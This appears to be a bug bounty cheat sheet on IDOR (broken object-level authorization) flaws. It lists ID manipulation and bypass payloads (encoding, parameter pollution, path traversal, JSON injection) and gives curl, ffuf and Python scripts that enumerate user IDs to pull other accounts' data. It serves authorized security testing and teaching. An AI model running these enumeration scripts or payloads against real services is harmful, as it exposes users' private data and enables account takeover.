# 🔓 IDOR - Insecure Direct Object Reference

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Insecure Direct Object Reference
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 Table of Contents

- [What is IDOR](#-what-is-idor)
- [Where to Look](#-where-to-look)
- [ID Types & Manipulation](#-id-types--manipulation)
- [Bypass Techniques](#-bypass-techniques)
- [Testing Methodology](#-testing-methodology)
- [Tools & Automation](#-tools--automation)

---

## 🎯 What is IDOR

**IDOR** occurs when an application exposes direct references to internal objects (database records, files, etc.) without proper authorization checks.

### Impact
- 🔴 **Data Theft** - Access other users' data
- 🔴 **Privilege Escalation** - Access admin features
- 🔴 **Account Takeover** - Modify other accounts
- 🔴 **Data Manipulation** - Delete/modify records

### IDOR vs BOLA
| IDOR | BOLA |
|------|------|
| Traditional term | API Security term |
| Broken Object Level Authorization |

---

## 🔍 Where to Look

### URL Parameters
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### POST/PUT Body
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Headers
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Common Parameters
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Common Endpoints
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 ID Types & Manipulation

### Sequential IDs
```
# Most common - just increment/decrement
/api/users/1
/api/users/2
/api/users/3

# Test boundaries
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Check if truly random
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Increment last part

# Check for patterns
# Time-based UUIDs (v1) - predictable
# Random UUIDs (v4) - harder to guess
```

### Encoded IDs
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Test encoded
/api/users/MTIz  → decode = 123
/api/users/MTI0  → decode = 124

# Hex encoding
123 → 7b
124 → 7c
```

### Hashed IDs
```
# MD5 of ID
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Try different algorithms
# Check if hash is ID-based or random
```

### Custom Formats
```
# Prefixed IDs
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Timestamp-based
/file/20240128_001
/file/20240128_002
```

---

## 🛡️ Bypass Techniques

### Parameter Manipulation
```bash
# Original
GET /api/users/123

# Variations
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### HTTP Method Change
```bash
# If GET blocked, try others
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### Wrap in Arrays/Objects
```json
// If id=124 blocked, try:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Encoding Bypass
```
# URL encode
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Double encode
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → Full-width 124
```

### Case Manipulation
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Path Traversal Combo
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Null Byte
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### JSON Parameter Injection
```json
// Original request
{"user_id": 123, "action": "view"}

// Attack
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Testing Methodology

### Step 1: Identify
```
1. Map all endpoints with object references
2. Note all parameters that look like IDs
3. Create two test accounts (User A & User B)
```

### Step 2: Enumerate
```
1. As User A, note your IDs
2. As User B, note your IDs
3. Identify ID patterns
```

### Step 3: Test
```
1. As User A, try accessing User B's objects
2. Test all CRUD operations:
   - Read (GET)
   - Create (POST)
   - Update (PUT/PATCH)
   - Delete (DELETE)
```

### Step 4: Escalate
```
1. Try admin IDs (often 1, admin, 0)
2. Try special values (null, undefined, *)
3. Combine with other vulns
```

### Checklist
```markdown
- [ ] URL parameters
- [ ] POST body parameters
- [ ] Headers (cookies, custom)
- [ ] Hidden form fields
- [ ] API endpoints
- [ ] File downloads
- [ ] Export functions
- [ ] Delete functions
- [ ] Admin functions
```

---

## 🛠️ Tools & Automation

### Burp Suite Extensions
```
- Autorize (automatic IDOR detection)
- AuthMatrix
- Auto Repeater
```

### Autorize Setup
```
1. Install Autorize extension
2. Copy session cookie from User B
3. Add to Autorize
4. Browse as User A
5. Autorize tests with User B's session
```

### Manual Testing with curl
```bash
# User A token
TOKEN_A="user_a_jwt_token"

# Try User B's resource
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Loop through IDs
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf for IDOR
```bash
# Numeric IDs
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# With wordlist
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Python Script
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Quick Reference

### Common Vulnerable Functions
| Function | Risk |
|----------|------|
| View profile | Data leak |
| Download file | File access |
| Delete item | Data loss |
| Update settings | Account takeover |
| View orders | Privacy breach |
| Export data | Mass data theft |

### What to Report
```markdown
## IDOR in User Profile

**Endpoint:** GET /api/users/{id}

**Steps:**
1. Login as User A (ID: 123)
2. Request GET /api/users/124
3. Observe User B's data is returned

**Impact:** Any authenticated user can access 
all other users' personal information.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Pro Tips

1. **Use two accounts** - Always test with 2 accounts
2. **Check all methods** - GET, POST, PUT, DELETE
3. **Look everywhere** - URLs, body, headers, cookies
4. **Try edge cases** - 0, -1, null, undefined
5. **Combine attacks** - IDOR + CSRF, IDOR + XSS
6. **Check exports** - PDF, CSV exports often vulnerable
7. **Mobile APIs** - Often less secure than web

---

## 📚 Resources

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger Access Control](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Find Those IDORs!</b><br>
  <i>For authorized testing only!</i>
</p>
